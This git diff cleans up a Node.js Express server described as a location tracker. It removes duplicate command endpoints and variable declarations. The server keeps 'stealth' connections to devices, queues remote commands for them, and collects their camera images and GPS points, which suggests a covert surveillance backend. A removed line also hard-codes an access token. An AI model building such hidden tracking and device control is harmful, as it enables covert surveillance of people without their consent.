@@ -8,11 +8,12 @@ import http from "http";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ДОБАВЬТЕ ЭТУ СТРОКУ ЗДЕСЬ:
+// Объявляем Map'ы один раз
 const deviceCommands = new Map();
-
 const locations = new Map();
 const stealthConnections = new Map();
+const webClients = new Set();
+
 console.log("Starting location tracker server...");
 
 const server = http.createServer(app);
@@ -37,9 +38,6 @@ app.use(bodyParser.json({ limit: "50mb" }));
 app.use(express.static("public"));
 
 // === WebSocket setup ===
-const stealthConnections = new Map();
-const webClients = new Set();
-
 const wss = new WebSocketServer({ noServer: true });
 
 server.on("upgrade", (request, socket, head) => {
@@ -174,6 +172,7 @@ app.post("/api/login", (req, res) => {
   return res.status(401).json({ success: false, error: "Invalid credentials" });
 });
 
+// GET endpoint для HTTP polling (ОДИН РАЗ)
 app.get('/api/device/:deviceId/command/:token', (req, res) => {
   const { deviceId, token } = req.params;
   
@@ -184,7 +183,7 @@ app.get('/api/device/:deviceId/command/:token', (req, res) => {
   const command = deviceCommands.get(deviceId);
   
   if (command && (Date.now() - command.timestamp) < 30000) {
-    console.log(`Delivering command to ${deviceId}: ${command.action}`);
+    console.log(`✓ Delivering command to ${deviceId}: ${command.action}`);
     deviceCommands.delete(deviceId);
     return res.json({ 
       action: command.action, 
@@ -195,6 +194,7 @@ app.get('/api/device/:deviceId/command/:token', (req, res) => {
   return res.json({ action: null });
 });
 
+// POST endpoint для отправки команд (ОДИН РАЗ)
 app.post("/api/device/command", (req, res) => {
   const { device_id, command, token } = req.body;
   
@@ -206,15 +206,13 @@ app.post("/api/device/command", (req, res) => {
     return res.status(403).json({ error: "Forbidden" });
   }
   
-  // Сохраняем для HTTP polling
   deviceCommands.set(device_id, {
     action: command.toLowerCase(),
     timestamp: Date.now()
   });
   
-  console.log(`✓ Command queued for HTTP polling`);
+  console.log(`✓ Command queued for HTTP polling: ${command}`);
   
-  // Также пробуем WebSocket
   const entry = stealthConnections.get(device_id);
   if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
     try {
@@ -238,66 +236,6 @@ app.post("/api/camera/image", (req, res) => {
   const { type, device_id, data, timestamp } = req.body;
   broadcastToWebClients({ type, deviceId: device_id, data, timestamp: timestamp || Date.now() });
   return res.json({ success: true });
-});
-
-// GET endpoint для HTTP polling
-app.get('/api/device/:deviceId/command/:token', (req, res) => {
-  const { deviceId, token } = req.params;
-  
-  if (token !== 'your_secret_key_123') {
-    return res.status(403).json({ error: "Forbidden" });
-  }
-  
-  const command = deviceCommands.get(deviceId);
-  
-  if (command && (Date.now() - command.timestamp) < 30000) {
-    console.log(`✓ Delivering command to ${deviceId}: ${command.action}`);
-    deviceCommands.delete(deviceId);
-    return res.json({ 
-      action: command.action, 
-      timestamp: command.timestamp 
-    });
-  }
-  
-  // Нет команд - это нормально
-  return res.json({ action: null });
-});
-
-// POST endpoint для отправки команд (измените существующий)
-app.post("/api/device/command", (req, res) => {
-  const { device_id, command, token } = req.body;
-  
-  console.log(`=== COMMAND REQUEST ===`);
-  console.log(`Device ID: ${device_id}`);
-  console.log(`Command: ${command}`);
-  
-  if (token !== SECRET_TOKEN) {
-    return res.status(403).json({ error: "Forbidden" });
-  }
-  
-  // Сохраняем для HTTP polling
-  deviceCommands.set(device_id, {
-    action: command.toLowerCase(),
-    timestamp: Date.now()
-  });
-  
-  console.log(`✓ Command queued for HTTP polling: ${command}`);
-  
-  // Также пробуем WebSocket
-  const entry = stealthConnections.get(device_id);
-  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
-    try {
-      entry.ws.send(JSON.stringify({ 
-        action: command.toLowerCase(), 
-        timestamp: Date.now() 
-      }));
-      console.log(`✓ Also sent via WebSocket`);
-    } catch (err) {
-      console.error("WebSocket send failed:", err);
-    }
-  }
-  
-  return res.json({ success: true, method: 'http_polling' });
 });
 
 app.delete("/api/device/:device_id/:token", async (req, res) => {
@@ -446,7 +384,7 @@ function validateGPSPoint(lat, lng, accuracy) {
   return true;
 }
 
-function filterDuplicatePoints(locations, minDistance = 20) { // Увеличили с 10 до 20
+function filterDuplicatePoints(locations, minDistance = 20) {
   if (!locations || locations.length < 2) return locations;
   const filtered = [locations[0]];
 
@@ -459,7 +397,6 @@ function filterDuplicatePoints(locations, minDistance = 20) { // Увеличи�
       parseFloat(curr.latitude), parseFloat(curr.longitude)
     );
 
-    // Учитываем точность
     const effectiveDistance = distance - (prev.accuracy || 0) - (curr.accuracy || 0);
 
     if (effectiveDistance > minDistance) {
@@ -486,8 +423,3 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-
-
-
-
-
